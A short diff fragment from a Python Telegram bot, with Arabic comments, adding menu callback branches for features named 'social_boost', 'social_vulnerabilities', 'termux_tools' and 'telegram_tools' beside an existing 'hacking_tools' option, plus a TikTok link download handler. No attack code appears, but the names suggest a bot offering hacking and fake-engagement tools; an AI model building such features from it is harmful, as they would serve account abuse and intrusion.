+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
+    )
 
 # ======================== باقي الدوال ========================
 
@@ -546,6 +1426,22 @@ async def button(update: Update, context) -> int:
     
     elif query.data == 'generate_name':
         await generate_name(update, context)
+        return CHOOSING_MAIN_MENU
+    
+    elif query.data == 'social_boost':
+        await social_boost(update, context)
+        return CHOOSING_MAIN_MENU
+    
+    elif query.data == 'social_vulnerabilities':
+        await social_vulnerabilities(update, context)
+        return CHOOSING_MAIN_MENU
+    
+    elif query.data == 'termux_tools':
+        await termux_tools(update, context)
+        return CHOOSING_MAIN_MENU
+    
+    elif query.data == 'telegram_tools':
+        await telegram_tools(update, context)
         return CHOOSING_MAIN_MENU
 
     elif query.data == 'hacking_tools':
@@ -1192,7 +2088,6 @@ def main() -> None:
         per_message=False
     )
 
-    # معالج روابط تيك توك - فقط للروابط
     application.add_handler(MessageHandler(
         filters.TEXT & ~filters.COMMAND & filters.Regex(r'https?://(?:www\.|vm\.|vt\.)?tiktok\.com/[^\s]+'),
         handle_tiktok_download
